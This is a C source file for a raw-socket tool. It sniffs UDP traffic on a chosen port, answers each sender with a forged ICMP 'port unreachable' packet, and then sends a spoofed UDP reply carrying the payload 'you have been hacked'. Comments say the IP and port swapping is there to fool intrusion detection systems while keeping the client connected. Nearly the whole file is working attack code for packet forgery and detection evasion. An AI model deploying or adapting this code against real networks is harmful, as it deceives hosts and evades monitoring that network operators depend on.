#include "server.h"

#define DATA "you have been hacked"

pcap_t* pd;
int sock = 0, one = 1;
int sender_port = 0;
int debug_output = 0;

void parse_packet(u_char *user, struct pcap_pkthdr *packethdr, 
                  u_char *packetptr)
{
    struct ip* iphdr;
    struct udphdr* udphdr;
    char iphdrInfo[256], srcip[256], dstip[256];
        
    int bytes;
    struct iphdr *ipHdr;
    struct udphdr *udpHdr;
    struct icmphdr *icmpHdr;
    char *data;
    char packet[2048];
    char buf[4];
    struct sockaddr_in addr_in;
 
    // Skip the datalink layer header and get the IP header fields.
    packetptr += linkhdrlen;
    iphdr = (struct ip*)packetptr;
    strcpy(srcip, inet_ntoa(iphdr->ip_src));
    strcpy(dstip, inet_ntoa(iphdr->ip_dst));
    sprintf(iphdrInfo, "ID:%d TOS:0x%x, TTL:%d IpLen:%d DgLen:%d",
            ntohs(iphdr->ip_id), iphdr->ip_tos, iphdr->ip_ttl,
            4*iphdr->ip_hl, ntohs(iphdr->ip_len));
 
    // Advance to the transport layer header then parse and display
    // the fields based on the type of hearder: tcp, udp or icmp.
    packetptr += 4*iphdr->ip_hl;
    if (iphdr->ip_p == IPPROTO_UDP )
    {
        udphdr = (struct udphdr*)packetptr;
        if (debug_output)
            printf("[*] UDP  %s:%d -> %s:%d\t", srcip, ntohs(udphdr->source), dstip, ntohs(udphdr->dest));
        
        sender_port = ntohs(udphdr->source);
        
        addr_in.sin_family = AF_INET;
        addr_in.sin_port = udphdr->source;
        addr_in.sin_addr.s_addr = iphdr->ip_src.s_addr;

        memset(packet, 0, sizeof(packet));
        ipHdr = (struct iphdr *) packet;
        icmpHdr = (struct icmphdr *) (packet + sizeof(struct iphdr));
        data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));

        ipHdr->ihl = 5;
        ipHdr->version = 4;
        ipHdr->tos = 0;
        ipHdr->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + ntohs(iphdr->ip_len);
        ipHdr->id = htons(rand());
        ipHdr->frag_off = 0x00; 
        ipHdr->ttl = 0xFF;
        ipHdr->protocol = IPPROTO_ICMP;
        ipHdr->check = 0;
        ipHdr->saddr = iphdr->ip_dst.s_addr;
        ipHdr->daddr = iphdr->ip_src.s_addr;

        ipHdr->check = csum((unsigned short *) packet, ipHdr->tot_len); 

        icmpHdr->type = ICMP_DEST_UNREACH;
        icmpHdr->code = ICMP_PORT_UNREACH;
        icmpHdr->checksum = 0x0;
        icmpHdr->un.gateway = 0x0; // UNUSED
        
        memcpy(data, iphdr, ntohs(iphdr->ip_len));
        
        // Change IPs and Ports to fool IDS and not to cause client to close the connection
        memcpy(buf, data+12, 4); // Change IPs
        memcpy(data+12, data+16, 4);
        memcpy(data+16, buf, 4);
        memcpy(buf, data+20, 2); // Change Ports
        memcpy(data+20, data+22, 2);
        memcpy(data+22, buf, 2);
        
        icmpHdr->checksum = csum((uint16_t *) icmpHdr, sizeof(struct icmphdr) + ntohs(iphdr->ip_len));
        
        printf("[+] Incoming connection from <%s:%d>\n", srcip, ntohs(udphdr->source));
        if((bytes = sendto(sock, packet, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0)
            perror("Error on sendto()");
        else
            printf("\t[+] [%s:%d] Sending ICMP Dest. Unreachable\n", srcip, ntohs(udphdr->source));
        
        memset(icmpHdr, 0x0, ipHdr->tot_len - sizeof(struct iphdr));
        udpHdr = (struct udphdr *) (packet + sizeof(struct iphdr));
        data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr));
        strcpy(data, DATA);
        
        ipHdr->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);
        ipHdr->protocol = IPPROTO_UDP;
            
        udpHdr->source = udphdr->dest;
        udpHdr->dest = udphdr->source;
        udpHdr->len = htons(sizeof(struct udphdr) + strlen(data));
        udpHdr->check = 0x0;
        
        udpHdr->check = udp_checksum(udpHdr, sizeof(struct udphdr) + strlen(data), ipHdr->saddr, ipHdr->daddr);
        
        if((bytes = sendto(sock, packet, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0)
            perror("Error on sendto()");
        else
            printf("\t[+] [%s:%d] Sending HACKING response data\n", srcip, ntohs(udphdr->source));
    }
}


int main(int argc, char **argv)
{
    char help[256] = "";
    char interface[256] = "", bpfstr[256] = "", port[256] = "";
    int c;
    
    sprintf(help, "usage: %s -i <interface> -p <port: 1..65535> [-d] \n\t-d\tenable debug output\n\n", argv[0]);
    
    if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Error while creating socket");
        exit(-1);
    }

    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
        perror("Error while setting socket options");
        exit(-1);
    }
    
    while ((c = getopt (argc, argv, "hadi:p:")) != -1)
    {
        switch (c)
        {
        case 'i':
            strcpy(interface, optarg);
            break;
        case 'p':
            strcpy(port, optarg);
            break;
        case 'd':
            debug_output = 1;
            break;
        case 'h':
        default:
            printf("%s",help);
            exit(0);
            break;
        }
    }
    
    if (atoi(port) < 1 || atoi(port) > 65535 || interface[0] == 0x0)
    {
        printf("%s", help);
        exit(0);
    }
    
    strcat(bpfstr, "udp and dst port ");
    strcat(bpfstr, port);
    
    if ((pd = open_pcap_socket(interface, bpfstr)))
    {
        capture_loop(pd, 0, (pcap_handler)parse_packet);
    }
    exit(0);
}
